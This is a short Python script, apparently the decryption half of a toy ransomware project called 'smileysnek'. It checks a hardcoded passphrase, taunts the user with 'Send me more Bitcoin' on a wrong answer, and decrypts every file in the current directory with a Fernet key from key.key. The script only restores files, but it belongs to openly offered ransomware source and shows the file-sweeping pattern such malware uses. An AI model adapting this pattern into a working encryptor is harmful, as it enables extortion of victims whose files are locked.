#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# Secret passphrase to decrypt
secret_phrase = "hiss"
user_phrase = input("Enter the secret phrase to decrypt your files: ")

if user_phrase != secret_phrase:
    print("Sorry. Wrong secret phrase. Send me more Bitcoin.")
    exit()

# Read key from file
with open('key.key', 'rb') as key_file:
    secret_key = key_file.read()

fernet = Fernet(secret_key)

# Gather files to decrypt
files = []
for file in os.listdir():
    if file in ('smileysnek.py', 'key.key', 'decrypt.py'):
        continue
    if os.path.isfile(file):
        files.append(file)

# Decrypt each file
for file in files:
    with open(file, 'rb') as f:
        contents = f.read()

    decrypted = fernet.decrypt(contents)

    with open(file, 'wb') as f:
        f.write(decrypted)

print("Congrats. Your files are decrypted. Excuse me while I slither away")
